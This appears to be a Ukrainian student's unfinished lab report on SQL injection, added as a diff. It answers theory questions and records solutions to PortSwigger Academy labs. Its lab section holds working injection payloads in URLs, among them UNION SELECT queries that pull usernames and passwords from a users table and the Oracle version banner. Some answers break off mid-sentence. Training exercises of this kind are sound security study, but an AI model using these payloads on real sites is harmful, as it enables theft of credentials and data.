@@ -1,0 +1,50 @@
+1. Дати визначення що таке SQL ін'єкція. Чому вона виникає. Які існують методи усунення цієї вразливості.
+SQL ін'єкція являє собою відправку модифікованих SQL запитів до серверу для досягнення певної мети – отримати доступ до якихось даних з БД, змінити чи видалити їх, втручатися в роботу системи.
+Гобально вразливість до SQL ін'єкцій виникає через те, що система оброблює користуваць
+
+
+2. Які види ін'єкцій існують. Надайте опис до будь-яких 2 з них у спеціфіці цієї вразливості.
+Взагалі можна виокремити 3 основні групи: error based, union based та blind (тут виділяються boolean і time based).
+Якщо казати про error based SQL ін'єкції, то вони полягають у збиранні інформації про БД з тексту повідомлень про помилки від БД серверу. Зловмисник може перебирати 
+
+3. Створіть обліковий запис на сійті https://portswigger.net/
++
+
+4. Перейдіть у розділ всіх лабораторних робіт https://portswigger.net/web-security/all-labs . Виконайте 4 тестових завдання по темі SQL ін'єкцій. До звіту додайте свій користувацький ввод та скріншот з успішним виконанням
+
+LAB1 SQL injection UNION attack, determining the number of columns returned by the query
+Два альтернативні способи:
+#1 додати UNION та перебрати кількість, допоки не отримуємо 200:
+https://0ab4000003118c4f80de534900f2008e.web-security-academy.net/filter?category=Pets%27+UNION+SELECT+NULL--
+https://0ab4000003118c4f80de534900f2008e.web-security-academy.net/filter?category=Pets%27+UNION+SELECT+NULL,+NULL--
+https://0ab4000003118c4f80de534900f2008e.web-security-academy.net/filter?category=Pets%27+UNION+SELECT+NULL,+NULL,+NULL--
+#2 додати ORDER BY та перебрати кількість допоки сервер почне повертати пятисотку
+https://0ab4000003118c4f80de534900f2008e.web-security-academy.net/filter?category=Pets%27+ORDER+BY+2--
+https://0ab4000003118c4f80de534900f2008e.web-security-academy.net/filter?category=Pets%27+ORDER+BY+3--
+https://0ab4000003118c4f80de534900f2008e.web-security-academy.net/filter?category=Pets%27+ORDER+BY+4-- 
+LAB2 SQL injection UNION attack, retrieving data from other tables
+step#1 визначити кількість стовпчиків в поточній таблиці шляхом перебирання в ORDER BY 1++
+https://0a6300af033cddc58097590400000007.web-security-academy.net/filter?category=Accessories%27+ORDER+BY+3--
+step#2 визначити, чи в в поточній таблиці обидва стовпчики мають текстовий формат (щоб використовувати UNION, в стовпчиках з 2 таблиць повинний бути однаковий тип даних)
+https://0a6300af033cddc58097590400000007.web-security-academy.net/filter?category=Accessories%27+UNION+SELECT+%27sdsd%27,%27sdsd%27--
+step#3 відправити запит з UNION, щоб дістати потрібні дані з таблиці users
+https://0a7100eb035e88de8117eebc003a00ea.web-security-academy.net/filter?category=Accessories%27+UNION+SELECT+username,+password+FROM+users--
+
+LAB3 SQL injection attack, querying the database type and version on Oracle
+step#1 визначити кількість стовпчиків в поточній таблиці
+https://0af100e203984b4e858d687b0073004f.web-security-academy.net/filter?category=Toys+%26+Games%27+ORDER+BY+2--
+https://0af100e203984b4e858d687b0073004f.web-security-academy.net/filter?category=Toys+%26+Games%27+ORDER+BY+3--
+step#2 визначити, чи стовбчики мають текстовий формат
+https://0af100e203984b4e858d687b0073004f.web-security-academy.net/filter?category=Toys+%26+Games%27+UNION+SELECT+%27dsdsd%27,%27sdsdd%27+FROM+dual--
+step#3 відправити запит з UNION, запитуючи значення з стовпчика BANNER, що містить дані про ДБ, 
+https://0ad300a703093cd080c40875006900d3.web-security-academy.net/filter?category=Food+%26+Drink%27+UNION+SELECT+BANNER,NULL+FROM+v$version--
+
+LAB4 Blind SQL injection with time delays
+step#1 
+step#2 
+step#3 
+5.Який вплив на систему та які наслідки може спричинити такий тип вразливостей? Аргументуйте свою відповідь.
+В цілому, усі вразливості до SQL ін'єкцій можуть призвести до витоку конфіденційних даних, втрати даних, порушення або припинення функціонування системи та інши невеслих наслідків.
+Вразливості, пов'язані з можливістю отримати інформацію про одну таблицю, відкривають можливості дістатись до інших таблиць, які становлять цінність для зловмисника. Таким чином можна прочитати або навіть у деяких випадках змінити, видалити, додати дані у БД.
+Вразливості, пов'язані з можливістю отримати дані про сервер, теоретично можуть допомогти втручатись в роботу системи, порушити логіку роботи, покласти сервер, тощо. Можливо, спираючись на знання типу, версії БД зловмисник може передбачити, які саме вразливості там ймовірніші, куди треба копати, та може планувати свої подальші дії.
+
